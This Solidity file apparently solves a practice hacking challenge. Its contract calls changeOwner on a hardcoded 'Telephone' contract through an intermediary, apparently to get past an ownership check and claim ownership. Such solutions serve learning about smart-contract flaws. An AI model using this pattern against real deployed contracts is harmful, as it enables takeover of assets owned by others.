// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract MyTelephone {

    Telephone original = Telephone(0x603542d554781d8F59A59f5a81BfDE93D5b3e50F);
    function claimFor(address _owner) public {
        original.changeOwner(_owner);
    }
}